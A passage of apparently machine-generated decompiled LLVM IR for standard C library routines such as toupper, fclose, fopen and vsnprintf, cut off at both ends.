  uselistorder i32 %v0_804dc28, { 1, 0 }
  uselistorder label %dec_label_pc_804dc48, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804dc54 = load i32, i32* inttoptr (i32 134584408 to i32*), align 8
  %v2_804dc59 = mul i32 %arg1, 2
  %v3_804dc59 = add i32 %v0_804dc54, %v2_804dc59
  %v4_804dc59 = inttoptr i32 %v3_804dc59 to i16*
  %v5_804dc59 = load i16, i16* %v4_804dc59, align 2
  %v6_804dc59 = zext i16 %v5_804dc59 to i32
  %v1_804dc5d = and i32 %v6_804dc59, 32
  ret i32 %v1_804dc5d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804dc68 = add i32 %arg1, 128
  %v6_804dc73 = icmp ugt i32 %v1_804dc68, 383
  br i1 %v6_804dc73, label %dec_label_pc_804dc7e, label %dec_label_pc_804dc75

dec_label_pc_804dc75:                             ; preds = %entry
  %v0_804dc75 = load i32, i32* inttoptr (i32 134584416 to i32*), align 32
  %v2_804dc7a = mul i32 %arg1, 2
  %v3_804dc7a = add i32 %v0_804dc75, %v2_804dc7a
  %v4_804dc7a = inttoptr i32 %v3_804dc7a to i16*
  %v5_804dc7a = load i16, i16* %v4_804dc7a, align 2
  %v6_804dc7a = sext i16 %v5_804dc7a to i32
  store i32 %v6_804dc7a, i32* @edx, align 4
  br label %dec_label_pc_804dc7e

dec_label_pc_804dc7e:                             ; preds = %entry, %dec_label_pc_804dc75
  %v0_804dc7e = phi i32 [ %arg1, %entry ], [ %v6_804dc7a, %dec_label_pc_804dc75 ]
  ret i32 %v0_804dc7e

; uselistorder directives
  uselistorder label %dec_label_pc_804dc7e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805fd60.194 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804dc8c = load i32, i32* @ebp, align 4
  %v0_804dc8d = load i32, i32* @edi, align 4
  %v0_804dc8e = load i32, i32* @esi, align 4
  %v0_804dc8f = load i32, i32* @ebx, align 4
  %v4_804dc93 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dc93, i32* @esi, align 4
  %v1_804dc97 = add i32 %v4_804dc93, 52
  %v2_804dc97 = inttoptr i32 %v1_804dc97 to i32*
  %v3_804dc97 = load i32, i32* %v2_804dc97, align 4
  store i32 %v3_804dc97, i32* @ebp, align 4
  %v1_804dc9a = icmp eq i32 %v3_804dc97, 0
  %v1_804dc9c = icmp eq i1 %v1_804dc9a, false
  br i1 %v1_804dc9c, label %dec_label_pc_804dcbd, label %dec_label_pc_804dc9e

dec_label_pc_804dc9e:                             ; preds = %entry
  %v1_804dc9e = add i32 %v4_804dc93, 56
  store i32 %v1_804dc9e, i32* @ebx, align 4
  %v2_804dca8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dca8, i32* @eax, align 4
  %v2_804dcad = call i32 @__pthread_return_void(i32 %v2_804dca8, i32 134550975)
  %v0_804dcb2 = load i32, i32* @ebx, align 4
  %v1_804dcb5 = call i32 @__pthread_return_0(i32 %v0_804dcb2)
  store i32 %v1_804dcb5, i32* @eax, align 4
  %v0_804dcbf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dcbd

dec_label_pc_804dcbd:                             ; preds = %entry, %dec_label_pc_804dc9e
  %v0_804dcc7 = phi i32 [ %v4_804dc93, %entry ], [ %v0_804dcbf.pre, %dec_label_pc_804dc9e ]
  store i32 0, i32* @edi, align 4
  %v1_804dcbf = inttoptr i32 %v0_804dcc7 to i8*
  %v2_804dcbf = load i8, i8* %v1_804dcbf, align 1
  %v3_804dcbf = and i8 %v2_804dcbf, 64
  %v4_804dcbf = icmp eq i8 %v3_804dcbf, 0
  br i1 %v4_804dcbf, label %dec_label_pc_804dcbd.dec_label_pc_804dcd2_crit_edge, label %dec_label_pc_804dcc4

dec_label_pc_804dcbd.dec_label_pc_804dcd2_crit_edge: ; preds = %dec_label_pc_804dcbd
  br label %dec_label_pc_804dcd2

dec_label_pc_804dcc4:                             ; preds = %dec_label_pc_804dcbd
  %v1_804dcc8 = inttoptr i32 %v0_804dcc7 to i16*
  %v2_804dcc8 = call i32 @fflush_unlocked(i16* %v1_804dcc8)
  store i32 %v2_804dcc8, i32* @edi, align 4
  %v0_804dcd5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dcd2

dec_label_pc_804dcd2:                             ; preds = %dec_label_pc_804dcbd.dec_label_pc_804dcd2_crit_edge, %dec_label_pc_804dcc4
  %v0_804dcd5 = phi i32 [ %v0_804dcc7, %dec_label_pc_804dcbd.dec_label_pc_804dcd2_crit_edge ], [ %v0_804dcd5.pre, %dec_label_pc_804dcc4 ]
  %v1_804dcd5 = add i32 %v0_804dcd5, 4
  %v2_804dcd5 = inttoptr i32 %v1_804dcd5 to i32*
  %v3_804dcd5 = load i32, i32* %v2_804dcd5, align 4
  %v1_804dcd8 = call i32 @__libc_close(i32 %v3_804dcd5)
  store i32 %v1_804dcd8, i32* @eax, align 4
  %v2_804dce0 = icmp slt i32 %v1_804dcd8, 0
  %v1_804dce2 = icmp eq i1 %v2_804dce0, false
  br i1 %v1_804dce2, label %dec_label_pc_804dce7, label %dec_label_pc_804dce4

dec_label_pc_804dce4:                             ; preds = %dec_label_pc_804dcd2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804dce7

dec_label_pc_804dce7:                             ; preds = %dec_label_pc_804dcd2, %dec_label_pc_804dce4
  %v0_804dce7 = load i32, i32* @esi, align 4
  %v1_804dce7 = add i32 %v0_804dce7, 4
  %v2_804dce7 = inttoptr i32 %v1_804dce7 to i32*
  store i32 -1, i32* %v2_804dce7, align 4
  %v2_804dcf9 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804dcf9, i32* @ebx, align 4
  %v2_804dcfe = call i32 @__pthread_return_void(i32 %v2_804dcf9, i32 134550975)
  %v1_804dd0a = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059894.195 to i32))
  %v0_804dd0f = load i32, i32* @global_var_805db24.196, align 4
  %v1_804dd14 = add i32 %v0_804dd0f, 1
  store i32 %v1_804dd14, i32* @global_var_805db24.196, align 4
  store i32 ptrtoint (i32* @global_var_8059894.195 to i32), i32* @eax, align 4
  %v2_804dd1f = call i32 @__pthread_return_void(i32 %v2_804dcf9, i32 1)
  store i32 %v2_804dd1f, i32* @eax, align 4
  %v0_804dd27 = load i32, i32* @esi, align 4
  %v1_804dd27 = inttoptr i32 %v0_804dd27 to i16*
  %v2_804dd27 = load i16, i16* %v1_804dd27, align 2
  %v3_804dd27 = and i16 %v2_804dd27, 24576
  store i16 %v3_804dd27, i16* %v1_804dd27, align 2
  %v0_804dd2c = load i32, i32* @esi, align 4
  %v1_804dd2c = inttoptr i32 %v0_804dd2c to i16*
  %v2_804dd2c = load i16, i16* %v1_804dd2c, align 2
  %v3_804dd2c = or i16 %v2_804dd2c, 48
  store i16 %v3_804dd2c, i16* %v1_804dd2c, align 2
  br i1 %v1_804dc9c, label %dec_label_pc_804dd45, label %dec_label_pc_804dd34

dec_label_pc_804dd34:                             ; preds = %dec_label_pc_804dce7
  %v2_804dd38 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dd38, i32* @eax, align 4
  %v2_804dd3d = call i32 @__pthread_return_void(i32 %v2_804dd38, i32 1)
  store i32 %v2_804dd3d, i32* @eax, align 4
  br label %dec_label_pc_804dd45

dec_label_pc_804dd45:                             ; preds = %dec_label_pc_804dce7, %dec_label_pc_804dd34
  %v0_804dd45 = load i32, i32* @esi, align 4
  %v1_804dd45 = add i32 %v0_804dd45, 1
  %v2_804dd45 = inttoptr i32 %v1_804dd45 to i8*
  %v3_804dd45 = load i8, i8* %v2_804dd45, align 1
  %v4_804dd45 = and i8 %v3_804dd45, 64
  %v5_804dd45 = icmp eq i8 %v4_804dd45, 0
  br i1 %v5_804dd45, label %dec_label_pc_804dd59, label %dec_label_pc_804dd4b

dec_label_pc_804dd4b:                             ; preds = %dec_label_pc_804dd45
  %v1_804dd4e = add i32 %v0_804dd45, 8
  %v2_804dd4e = inttoptr i32 %v1_804dd4e to i32*
  %v3_804dd4e = load i32, i32* %v2_804dd4e, align 4
  %v1_804dd51 = call i32 @free(i32 %v3_804dd4e)
  store i32 %v1_804dd51, i32* @eax, align 4
  br label %dec_label_pc_804dd59

dec_label_pc_804dd59:                             ; preds = %dec_label_pc_804dd45, %dec_label_pc_804dd4b
  %v2_804dd65 = call i32 @__pthread_return_void(i32 %v2_804dcf9, i32 134550975)
  %v1_804dd71 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059894.195 to i32))
  store i32 ptrtoint (i32* @global_var_8059894.195 to i32), i32* @eax, align 4
  %v0_804dd78 = load i32, i32* @global_var_805db28.197, align 8
  %v1_804dd78 = add i32 %v0_804dd78, 1
  store i32 %v1_804dd78, i32* @global_var_805db28.197, align 8
  %v2_804dd81 = call i32 @__pthread_return_void(i32 %v2_804dcf9, i32 1)
  %v0_804dd86 = call i32 @_stdio_openlist_dec_use()
  %v0_804dd8e = load i32, i32* @edi, align 4
  store i32 %v0_804dc8f, i32* @ebx, align 4
  store i32 %v0_804dc8e, i32* @esi, align 4
  store i32 %v0_804dc8d, i32* @edi, align 4
  store i32 %v0_804dc8c, i32* @ebp, align 4
  ret i32 %v0_804dd8e

; uselistorder directives
  uselistorder label %dec_label_pc_804dd59, { 1, 0 }
  uselistorder label %dec_label_pc_804dd45, { 1, 0 }
  uselistorder label %dec_label_pc_804dce7, { 1, 0 }
  uselistorder label %dec_label_pc_804dcd2, { 1, 0 }
  uselistorder label %dec_label_pc_804dcbd, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804dda7 = inttoptr i32 %arg2 to i8*
  %v5_804dda7 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804dda7, i32 0, i32 -1)
  ret i32 %v5_804dda7
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804ddb3 = ptrtoint i32* %stack_var_12 to i32
  %v4_804ddc6 = inttoptr i32 %arg1 to i8*
  %v5_804ddc6 = call i32 @__GI_vsnprintf(i8* %v4_804ddc6, i32 -1, i32 %arg2, i32 %v2_804ddb3)
  ret i32 %v5_804ddc6
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ddd0 = load i32, i32* @ebp, align 4
  %v0_804ddd1 = load i32, i32* @edi, align 4
  %v0_804ddd2 = load i32, i32* @esi, align 4
  %v0_804ddd3 = load i32, i32* @ebx, align 4
  store i32 %v0_804ddd3, i32* %stack_var_-16, align 4
  %v4_804ddd7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ddd7, i32* @esi, align 4
  %v2_804dddb = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804de0c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804de0c, i32* @ebp, align 4
  %v1_804de10 = sub i32 -1, %v4_804ddd7
  store i32 %v1_804de10, i32* @ebx, align 4
  %v1_804de13 = call i32 @__stdio_init_mutex(i32 %v2_804dddb)
  %v0_804de23 = load i32, i32* @ebx, align 4
  %v1_804de23 = load i32, i32* @edi, align 4
  %tmp32 = icmp ugt i32 %v0_804de23, %v1_804de23
  br i1 %tmp32, label %dec_label_pc_804de27, label %dec_label_pc_804de29

dec_label_pc_804de27:                             ; preds = %entry
  store i32 %v1_804de23, i32* @ebx, align 4
  br label %dec_label_pc_804de29

dec_label_pc_804de29:                             ; preds = %entry, %dec_label_pc_804de27
  %v1_804de29 = phi i32 [ %v0_804de23, %entry ], [ %v1_804de23, %dec_label_pc_804de27 ]
  %v0_804de29 = load i32, i32* @esi, align 4
  %v2_804de29 = add i32 %v0_804de29, %v1_804de29
  %v4_804de54 = inttoptr i32 %arg3 to i8*
  %v5_804de54 = call i32 @_vfprintf_internal(i32 %v2_804de0c, i8* %v4_804de54, i32 %arg4, i32 %v2_804de29)
  store i32 %v5_804de54, i32* @edx, align 4
  %v0_804de5e = load i32, i32* @ebx, align 4
  %v1_804de5e = icmp eq i32 %v0_804de5e, 0
  br i1 %v1_804de5e, label %dec_label_pc_804de78, label %dec_label_pc_804de62

dec_label_pc_804de62:                             ; preds = %dec_label_pc_804de29
  %v16_804de66 = icmp eq i32 %v1_804de29, 0
  %v1_804de6a = icmp eq i1 %v16_804de66, false
  br i1 %v1_804de6a, label %dec_label_pc_804de71, label %dec_label_pc_804de6c

dec_label_pc_804de6c:                             ; preds = %dec_label_pc_804de62
  %v1_804de6c = add i32 %v2_804de29, -1
  br label %dec_label_pc_804de71

dec_label_pc_804de71:                             ; preds = %dec_label_pc_804de62, %dec_label_pc_804de6c
  %stack_var_-80.0.in = phi i32 [ %v0_804de29, %dec_label_pc_804de62 ], [ %v1_804de6c, %dec_label_pc_804de6c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804de7b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804de78

dec_label_pc_804de78:                             ; preds = %dec_label_pc_804de29, %dec_label_pc_804de71
  %v0_804de7b = phi i32 [ %v5_804de54, %dec_label_pc_804de29 ], [ %v0_804de7b.pre, %dec_label_pc_804de71 ]
  %v2_804de7d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804de7d, i32* @ebx, align 4
  store i32 %v0_804ddd2, i32* @esi, align 4
  store i32 %v0_804ddd1, i32* @edi, align 4
  store i32 %v0_804ddd0, i32* @ebp, align 4
  ret i32 %v0_804de7b

; uselistorder directives
  uselistorder i32 %v0_804de29, { 1, 0 }
  uselistorder i32 %v1_804de29, { 1, 0 }
  uselistorder i32 %v1_804de23, { 1, 2, 0 }
  uselistorder i32 %v0_804de23, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_804de78, { 1, 0 }
  uselistorder label %dec_label_pc_804de71, { 1, 0 }
  uselistorder label %dec_label_pc_804de29, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804de84 = load i32, i32* @ebp, align 4
  %v0_804de85 = load i32, i32* @edi, align 4
  %v0_804de86 = load i32, i32* @esi, align 4
  %v0_804de87 = load i32, i32* @ebx, align 4
  store i32 %v0_804de87, i32* %stack_var_-16, align 4
  %v4_804de8b = ptrtoint i8* %arg2 to i32
  store i32 %v4_804de8b, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804de9b = load i8, i8* %arg2, align 1
  %v3_804de9b = zext i8 %v2_804de9b to i32
  %v4_804de9b = load i32, i32* @eax, align 4
  %v5_804de9b = and i32 %v4_804de9b, -256
  %v6_804de9b = or i32 %v5_804de9b, %v3_804de9b
  store i32 %v6_804de9b, i32* %eax.global-to-local, align 4
  %v10_804de9d = icmp eq i8 %v2_804de9b, 114
  br i1 %v10_804de9d, label %dec_label_pc_804dedf, label %dec_label_pc_804dea1

dec_label_pc_804dea1:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804dea6 = icmp eq i8 %v2_804de9b, 119
  br i1 %v10_804dea6, label %dec_label_pc_804dee1, label %dec_label_pc_804deaa

dec_label_pc_804deaa:                             ; preds = %dec_label_pc_804dea1
  store i32 1089, i32* @ebx, align 4
  %v10_804deae = icmp eq i8 %v2_804de9b, 97
  br i1 %v10_804deae, label %dec_label_pc_804dee1, label %dec_label_pc_804deb2

dec_label_pc_804deb2:                             ; preds = %dec_label_pc_804df5a, %dec_label_pc_804df34, %dec_label_pc_804deaa
  %v0_804deb2 = load i32, i32* %stack_var_-16, align 4
  %v1_804deb2 = call i32 @__errno_location(i32 %v0_804deb2)
  store i32 %v1_804deb2, i32* %eax.global-to-local, align 4
  %v0_804deb7 = load i32, i32* @ebp, align 4
  %v1_804deb7 = icmp eq i32 %v0_804deb7, 0
  %v1_804deb9 = inttoptr i32 %v1_804deb2 to i32*
  store i32 22, i32* %v1_804deb9, align 4
  br i1 %v1_804deb7, label %dec_label_pc_804e0a7, label %dec_label_pc_804dec5

dec_label_pc_804dec5:                             ; preds = %dec_label_pc_804df83, %dec_label_pc_804deb2
  %v0_804dec5 = load i32, i32* @ebp, align 4
  %v1_804dec5 = add i32 %v0_804dec5, 1
  %v2_804dec5 = inttoptr i32 %v1_804dec5 to i8*
  %v3_804dec5 = load i8, i8* %v2_804dec5, align 1
  %v4_804dec5 = and i8 %v3_804dec5, 32
  %v5_804dec5 = icmp eq i8 %v4_804dec5, 0
  br i1 %v5_804dec5, label %dec_label_pc_804e0a7, label %dec_label_pc_804decf

dec_label_pc_804decf:                             ; preds = %dec_label_pc_804dec5
  store i32 %v0_804dec5, i32* %stack_var_-76, align 4
  %v1_804ded3 = call i32 @free(i32 %v0_804dec5)
  store i32 %v1_804ded3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e0a2

dec_label_pc_804dedf:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804dee1

dec_label_pc_804dee1:                             ; preds = %dec_label_pc_804deaa, %dec_label_pc_804dea1, %dec_label_pc_804dedf
  %v0_804def2 = phi i32 [ 1089, %dec_label_pc_804deaa ], [ 577, %dec_label_pc_804dea1 ], [ 1, %dec_label_pc_804dedf ]
  %v1_804dee1 = add i32 %v4_804de8b, 1
  store i32 %v1_804dee1, i32* %eax.global-to-local, align 4
  %v2_804dee4 = inttoptr i32 %v1_804dee1 to i8*
  %v3_804dee4 = load i8, i8* %v2_804dee4, align 1
  %v12_804dee4 = icmp eq i8 %v3_804dee4, 98
  br i1 %v12_804dee4, label %dec_label_pc_804deec, label %dec_label_pc_804deea

dec_label_pc_804deea:                             ; preds = %dec_label_pc_804dee1
  store i32 %v4_804de8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %dec_label_pc_804dee1, %dec_label_pc_804deea
  %v0_804deec = phi i32 [ %v1_804dee1, %dec_label_pc_804dee1 ], [ %v4_804de8b, %dec_label_pc_804deea ]
  %v1_804deec = add i32 %v0_804deec, 1
  %v2_804deec = inttoptr i32 %v1_804deec to i8*
  %v3_804deec = load i8, i8* %v2_804deec, align 1
  %v12_804deec = icmp eq i8 %v3_804deec, 43
  %v1_804def0 = icmp eq i1 %v12_804deec, false
  br i1 %v1_804def0, label %dec_label_pc_804defa, label %dec_label_pc_804def2

dec_label_pc_804def2:                             ; preds = %dec_label_pc_804deec
  store i32 %v0_804def2, i32* %eax.global-to-local, align 4
  %v1_804def7 = add nuw nsw i32 %v0_804def2, 1
  store i32 %v1_804def7, i32* @ebx, align 4
  br label %dec_label_pc_804defa

dec_label_pc_804defa:                             ; preds = %dec_label_pc_804deec, %dec_label_pc_804def2
  %v1_804defa = icmp eq i32 %arg3, 0
  %v1_804defc = icmp eq i1 %v1_804defa, false
  br i1 %v1_804defc, label %dec_label_pc_804df30, label %dec_label_pc_804defe

dec_label_pc_804defe:                             ; preds = %dec_label_pc_804defa
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804df03 = call i32 @malloc(i32 80)
  store i32 %v1_804df03, i32* %eax.global-to-local, align 4
  store i32 %v1_804df03, i32* @ebp, align 4
  %v2_804df0d = icmp eq i32 %v1_804df03, 0
  br i1 %v2_804df0d, label %dec_label_pc_804e0a9, label %dec_label_pc_804df15

dec_label_pc_804df15:                             ; preds = %dec_label_pc_804defe
  %v2_804df03 = inttoptr i32 %v1_804df03 to i16*
  store i16 8192, i16* %v2_804df03, align 2
  %v2_804df1d = add i32 %v1_804df03, 8
  %v3_804df1d = inttoptr i32 %v2_804df1d to i32*
  store i32 0, i32* %v3_804df1d, align 4
  %v2_804df24 = add i32 %v1_804df03, 56
  store i32 %v2_804df24, i32* %eax.global-to-local, align 4
  store i32 %v2_804df24, i32* %stack_var_-76, align 4
  %v1_804df28 = call i32 @__stdio_init_mutex(i32 %v2_804df24)
  store i32 %v1_804df28, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df30

dec_label_pc_804df30:                             ; preds = %dec_label_pc_804defa, %dec_label_pc_804df15
  %v2_804df30 = icmp slt i32 %arg4, 0
  br i1 %v2_804df30, label %dec_label_pc_804df7d, label %dec_label_pc_804df34

dec_label_pc_804df34:                             ; preds = %dec_label_pc_804df30
  %v0_804df34 = load i32, i32* @ebx, align 4
  %v0_804df36 = load i32, i32* @esi, align 4
  %v1_804df36 = add i32 %v0_804df36, 1
  store i32 %v1_804df36, i32* %eax.global-to-local, align 4
  %v1_804df39 = and i32 %v0_804df34, 32771
  store i32 %v1_804df39, i32* %edx.global-to-local, align 4
  %v1_804df3f = load i32, i32* @ebp, align 4
  %v2_804df3f = add i32 %v1_804df3f, 4
  %v3_804df3f = inttoptr i32 %v2_804df3f to i32*
  store i32 %arg4, i32* %v3_804df3f, align 4
  %v0_804df42 = load i32, i32* %edx.global-to-local, align 4
  %v1_804df42 = add i32 %v0_804df42, 1
  store i32 %v1_804df42, i32* @edx, align 4
  %v0_804df43 = load i32, i32* %eax.global-to-local, align 4
  %v2_804df43 = and i32 %v0_804df43, %v1_804df42
  store i32 %v2_804df43, i32* %eax.global-to-local, align 4
  %v12_804df45 = icmp eq i32 %v2_804df43, %v1_804df42
  %v1_804df47 = icmp eq i1 %v12_804df45, false
  br i1 %v1_804df47, label %dec_label_pc_804deb2, label %dec_label_pc_804df4d

dec_label_pc_804df4d:                             ; preds = %dec_label_pc_804df34
  %v0_804df4d = load i32, i32* @esi, align 4
  %v1_804df4f = and i32 %v0_804df4d, 1024
  %v1_804df51 = xor i32 %v1_804df4f, 1024
  store i32 %v1_804df51, i32* %eax.global-to-local, align 4
  %v1_804df56 = load i32, i32* @ebx, align 4
  %v2_804df56 = and i32 %v1_804df56, %v1_804df51
  %v3_804df56 = icmp eq i32 %v2_804df56, 0
  br i1 %v3_804df56, label %dec_label_pc_804df4d.dec_label_pc_804df73_crit_edge, label %dec_label_pc_804df5a

dec_label_pc_804df4d.dec_label_pc_804df73_crit_edge: ; preds = %dec_label_pc_804df4d
  br label %dec_label_pc_804df73

dec_label_pc_804df5a:                             ; preds = %dec_label_pc_804df4d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804df63 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804df63, i32* %eax.global-to-local, align 4
  %v1_804df6b = icmp eq i32 %v3_804df63, 0
  %v1_804df6d = icmp eq i1 %v1_804df6b, false
  br i1 %v1_804df6d, label %dec_label_pc_804deb2, label %dec_label_pc_804df5a.dec_label_pc_804df73_crit_edge

dec_label_pc_804df5a.dec_label_pc_804df73_crit_edge: ; preds = %dec_label_pc_804df5a
  %v0_804df73.pre = load i32, i32* @esi, align 4
  %v0_804df79.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804df73

dec_label_pc_804df73:                             ; preds = %dec_label_pc_804df4d.dec_label_pc_804df73_crit_edge, %dec_label_pc_804df5a.dec_label_pc_804df73_crit_edge
  %v0_804df79 = phi i32 [ %v1_804df56, %dec_label_pc_804df4d.dec_label_pc_804df73_crit_edge ], [ %v0_804df79.pre, %dec_label_pc_804df5a.dec_label_pc_804df73_crit_edge ]
  %v0_804df73 = phi i32 [ %v0_804df4d, %dec_label_pc_804df4d.dec_label_pc_804df73_crit_edge ], [ %v0_804df73.pre, %dec_label_pc_804df5a.dec_label_pc_804df73_crit_edge ]
  %v1_804df73 = and i32 %v0_804df73, 32768
  %v2_804df79 = or i32 %v1_804df73, %v0_804df79
  store i32 %v2_804df79, i32* @ebx, align 4
  br label %dec_label_pc_804df9e

dec_label_pc_804df7d:                             ; preds = %dec_label_pc_804df30
  %v1_804df7d = add i32 %arg4, 1
  %v8_804df7d = icmp eq i32 %v1_804df7d, 0
  store i32 %v1_804df7d, i32* @edi, align 4
  %v0_804df89.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804df7d, label %dec_label_pc_804df83, label %dec_label_pc_804df80

dec_label_pc_804df80:                             ; preds = %dec_label_pc_804df7d
  %v11_804df80 = or i32 %v0_804df89.pre, 32768
  store i32 %v11_804df80, i32* @ebx, align 4
  br label %dec_label_pc_804df83

dec_label_pc_804df83:                             ; preds = %dec_label_pc_804df7d, %dec_label_pc_804df80
  %v0_804df89 = phi i32 [ %v11_804df80, %dec_label_pc_804df80 ], [ %v0_804df89.pre, %dec_label_pc_804df7d ]
  %v0_804df8a = load i32, i32* @esi, align 4
  store i32 %v0_804df8a, i32* %stack_var_-76, align 4
  %v3_804df8b = inttoptr i32 %v0_804df8a to i8*
  %v4_804df8b = call i32 @__libc_open(i8* %v3_804df8b, i32 %v0_804df89)
  store i32 %v4_804df8b, i32* %eax.global-to-local, align 4
  %v1_804df93 = load i32, i32* @ebp, align 4
  %v2_804df93 = add i32 %v1_804df93, 4
  %v3_804df93 = inttoptr i32 %v2_804df93 to i32*
  store i32 %v4_804df8b, i32* %v3_804df93, align 4
  %v2_804df96 = icmp slt i32 %v4_804df8b, 0
  br i1 %v2_804df96, label %dec_label_pc_804dec5, label %dec_label_pc_804df9e

dec_label_pc_804df9e:                             ; preds = %dec_label_pc_804df83, %dec_label_pc_804df73
  %v0_804df9e = load i32, i32* @ebp, align 4
  %v1_804df9e = inttoptr i32 %v0_804df9e to i16*
  %v2_804df9e = load i16, i16* %v1_804df9e, align 2
  %v3_804df9e = and i16 %v2_804df9e, 8192
  store i16 %v3_804df9e, i16* %v1_804df9e, align 2
  %v0_804dfa4 = load i32, i32* @ebx, align 4
  %v8_804dfa6 = and i32 %v0_804dfa4, -31744
  %v1_804dfab = urem i32 %v0_804dfa4, 4
  %v1_804dfae = add nuw nsw i32 %v1_804dfab, 1
  store i32 %v1_804dfae, i32* %eax.global-to-local, align 4
  %v1_804dfaf = load i32, i32* @ebp, align 4
  %v2_804dfaf = inttoptr i32 %v1_804dfaf to i32*
  %v3_804dfaf = load i32, i32* %v2_804dfaf, align 4
  %v4_804dfaf = or i32 %v3_804dfaf, %v8_804dfa6
  %v1_804dfb2 = mul nuw nsw i32 %v1_804dfae, 16
  %v2_804dfb5 = xor i32 %v1_804dfb2, 48
  store i32 %v2_804dfb5, i32* %eax.global-to-local, align 4
  %v2_804dfb8 = or i32 %v4_804dfaf, %v2_804dfb5
  store i32 %v2_804dfb8, i32* @ebx, align 4
  %v1_804dfba = trunc i32 %v2_804dfb8 to i16
  %v3_804dfba = inttoptr i32 %v1_804dfaf to i16*
  store i16 %v1_804dfba, i16* %v3_804dfba, align 2
  %v0_804dfbe = load i32, i32* %stack_var_-76, align 4
  %v1_804dfbe = call i32 @__errno_location(i32 %v0_804dfbe)
  store i32 %v1_804dfbe, i32* %eax.global-to-local, align 4
  store i32 %v1_804dfbe, i32* @esi, align 4
  %v1_804dfc8 = inttoptr i32 %v1_804dfbe to i32*
  %v2_804dfc8 = load i32, i32* %v1_804dfc8, align 4
  store i32 %v2_804dfc8, i32* @edi, align 4
  %v0_804dfca = load i32, i32* @ebp, align 4
  %v1_804dfca = add i32 %v0_804dfca, 4
  %v2_804dfca = inttoptr i32 %v1_804dfca to i32*
  %v3_804dfca = load i32, i32* %v2_804dfca, align 4
  store i32 %v3_804dfca, i32* %stack_var_-76, align 4
  %v1_804dfcd = call i32 @isatty(i32 %v3_804dfca)
  %v2_804dfd5 = mul i32 %v1_804dfcd, 256
  store i32 %v2_804dfd5, i32* %eax.global-to-local, align 4
  %v0_804dfd8 = load i32, i32* @ebx, align 4
  %v2_804dfd8 = or i32 %v0_804dfd8, %v2_804dfd5
  store i32 %v2_804dfd8, i32* @ebx, align 4
  %v1_804dfda = trunc i32 %v2_804dfd8 to i16
  %v2_804dfda = load i32, i32* @ebp, align 4
  %v3_804dfda = inttoptr i32 %v2_804dfda to i16*
  store i16 %v1_804dfda, i16* %v3_804dfda, align 2
  %v0_804dfde = load i32, i32* @edi, align 4
  %v1_804dfde = load i32, i32* @esi, align 4
  %v2_804dfde = inttoptr i32 %v1_804dfde to i32*
  store i32 %v0_804dfde, i32* %v2_804dfde, align 4
  %v0_804dfe0 = load i32, i32* @ebp, align 4
  %v1_804dfe0 = add i32 %v0_804dfe0, 8
  %v2_804dfe0 = inttoptr i32 %v1_804dfe0 to i32*
  %v3_804dfe0 = load i32, i32* %v2_804dfe0, align 4
  %v4_804dfe0 = icmp eq i32 %v3_804dfe0, 0
  %v1_804dfe4 = icmp eq i1 %v4_804dfe0, false
  br i1 %v1_804dfe4, label %dec_label_pc_804e014, label %dec_label_pc_804dfe6

dec_label_pc_804dfe6:                             ; preds = %dec_label_pc_804df9e
